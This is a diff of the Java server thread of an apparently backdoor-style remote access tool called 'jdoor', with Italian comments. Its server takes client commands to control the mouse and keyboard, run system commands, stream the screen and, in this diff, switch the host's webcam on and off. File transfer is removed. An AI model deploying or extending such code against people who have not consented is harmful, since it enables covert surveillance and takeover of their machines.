@@ -1,11 +1,12 @@
 package com.jdoor.server;
 
+import com.github.sarxos.webcam.Webcam;
 import com.jdoor.Constants;
-import com.jdoor.FileOperationThread;
 import com.jdoor.server.mouse.MouseController;
 import com.jdoor.server.commands.CommandControllerThread;
 import com.jdoor.server.keyboard.KeyboardController;
 import com.jdoor.server.screen.ScreenCaptureThread;
+import com.jdoor.server.webcam.WebcamCaptureThread;
 
 import java.awt.*;
 import java.io.*;
@@ -26,7 +27,6 @@ public class ServerThread extends Thread {
 
     private final BufferedReader clientInput;
     private final BufferedWriter clientOutput;
-    private final FileOperationThread fileOperationThread;
     private boolean running;
     private boolean watching;
     public ServerThread(Socket socket) throws IOException {
@@ -34,20 +34,18 @@ public class ServerThread extends Thread {
 
         clientInput = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         clientOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
-        fileOperationThread = new FileOperationThread(new DataOutputStream(clientSocket.getOutputStream()), new DataInputStream(clientSocket.getInputStream()));
 
         datagramScreenSocket = new DatagramSocket();
         datagramWebcamSocket = new DatagramSocket();
 
         clientAddress = clientSocket.getInetAddress();
-        fileOperationThread.start();
         running = true;
         watching = true;
     }
 
     // Metodo per mandare la schermata.
     // Verrà chiamato solo da ScreenCaptureThread, NON VA CHIAMATO da nessun'altra parte.
-    public void sendScreen(byte[] buffer) {
+    public void sendStream(byte[] buffer, DatagramSocket socket, int port) {
         // Vedere quanti pacchetti servono per mandare l'immagine.
         // Visto che le immagini sono molto grandi e che un pacchetto UDP può essere massimo circa
         // 64kb, lo dividiamo in pacchetti di massimo 62kb per essere sicuri.
@@ -65,9 +63,9 @@ public class ServerThread extends Thread {
             //System.out.println("Slice è " + imageSlice.length + " di " + buffer.length);
 
             // Creare pacchetto UDP e mandarlo.
-            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, UDP_SCREEN_PORT);
+            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, port);
             try {
-                datagramScreenSocket.send(datagramPacket);
+                socket.send(datagramPacket);
                 //System.out.println(clientSocket + ": Sent screen");
             } catch (IOException e) {
                 e.printStackTrace();
@@ -78,45 +76,20 @@ public class ServerThread extends Thread {
 
         // Creare il pacchetto che indica che si è giunti al termine dell'immagine e spedirlo.
         byte[] endPkt = {'E', 'N', 'D'};
-        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, UDP_SCREEN_PORT);
+        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, port);
         try {
-            datagramScreenSocket.send(datagramPacket);
+            socket.send(datagramPacket);
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-    public void sendWebcam(byte[] buffer) {
+    public DatagramSocket getDatagramScreenSocket() {
+        return datagramScreenSocket;
+    }
 
-        int packets = (int) Math.ceil((float) buffer.length / Constants.IMAGE_BYTES_DIMENSION);
-        int bufIndex = 0;
-
-        for (int i = 0; i < packets; i++) {
-            //System.out.println("bufIndex: " + bufIndex);
-            // Ottenere un pezzo dell'immagine.
-            byte[] imageSlice = Arrays.copyOfRange(buffer, bufIndex, bufIndex + Constants.IMAGE_BYTES_DIMENSION);
-            //System.out.println("Slice è " + imageSlice.length + " di " + buffer.length);
-
-            // Creare pacchetto UDP e mandarlo.
-            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, UDP_WEBCAM_PORT);
-            try {
-                datagramWebcamSocket.send(datagramPacket);
-                //System.out.println(clientSocket + ": Sent screen");
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-            // Andare al prossimo pezzo d'immagine.
-            bufIndex += Constants.IMAGE_BYTES_DIMENSION + 1;
-        }
-
-        // Creare il pacchetto che indica che si è giunti al termine dell'immagine e spedirlo.
-        byte[] endPkt = {'E', 'N', 'D'};
-        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, UDP_WEBCAM_PORT);
-        try {
-            datagramWebcamSocket.send(datagramPacket);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+    public DatagramSocket getDatagramWebcamSocket() {
+        return datagramWebcamSocket;
     }
 
     // Vedere se il thread è finito.
@@ -133,61 +106,60 @@ public class ServerThread extends Thread {
         String command = "";
         try {
             while (running) {
-                if(!fileOperationThread.isTransferring()) {
-                    command = clientInput.readLine();
-                    System.out.println("Command: " + command);
+                command = clientInput.readLine();
+                System.out.println("Command: " + command);
 
-                    switch (command.charAt(0)) {
-                        case 'M':
-                            MouseController.getInstance().clickMouse(command);
-                            break;
+                switch (command.charAt(0)) {
+                    case 'M':
+                        MouseController.getInstance().clickMouse(command);
+                        break;
 
-                        case 'S':
-                            running = false;
-                            continue;
+                    case 'S':
+                        running = false;
+                        continue;
 
-                        case 'C':
-                            CommandControllerThread cct = new CommandControllerThread(clientOutput, command);
-                            cct.start();
-                            break;
+                    case 'C':
+                        CommandControllerThread cct = new CommandControllerThread(clientOutput, command);
+                        cct.start();
+                        break;
 
-                        case 'R':
-                            clientOutput.write(ScreenCaptureThread.SCREEN_SIZE + "\n");
-                            clientOutput.flush();
-                            break;
+                    case 'R':
+                        clientOutput.write(ScreenCaptureThread.SCREEN_SIZE + "\n");
+                        clientOutput.flush();
+                        break;
 
-                        case 'K':
-                            KeyboardController.getInstance().pressKeyboard(command);
-                            break;
+                    case 'K':
+                        KeyboardController.getInstance().pressKeyboard(command);
+                        break;
 
-                        case 'L':
-                            if(watching == true) {
-                                watching = false;
-                            } else {
-                                watching = true;
-                            }
-                            break;
-                        case 'F':
-                            File fileToTransfer = new File(command.split(" ")[1]);
-                            fileOperationThread.setFileToTransfer(fileToTransfer);
-                            switch (command.charAt(1)) {
-                                case 'R':
-                                    fileOperationThread.setOperation(Constants.FileOperations.Send);
-                                    break;
-                                case 'S':
-                                    fileOperationThread.setOperation(Constants.FileOperations.Get);
-                                    break;
-                            }
-                            break;
-                        default:
-                            System.out.println("Errore comando non riconosicuto: " + command);
-                            clientOutput.write("Unknown command: " + command + "\n");
-                            clientOutput.flush();
-                            break;
-                    }
+                    case 'L':
+                        if(watching == true) {
+                            watching = false;
+                        } else {
+                            watching = true;
+                        }
+                        break;
+
+                    case 'W':
+                        Webcam webcam = WebcamCaptureThread.getWebcamCaptureThread().getWebcam();
+                        switch (command.charAt(1)) {
+                            case 'O':
+                                if(!webcam.isOpen())
+                                   webcam.open();
+                                break;
+                            case 'C':
+                                if(webcam.isOpen())
+                                    webcam.close();
+                                break;
+                        }
+                        break;
+                    default:
+                        System.out.println("Errore comando non riconosicuto: " + command);
+                        clientOutput.write("Unknown command: " + command + "\n");
+                        clientOutput.flush();
+                        break;
                 }
             }
-            fileOperationThread.setRunning(false);
             clientSocket.close();
             clientSocket = null; // Indica che il client socket è stato chiuso.
         } catch (IOException | AWTException e) {
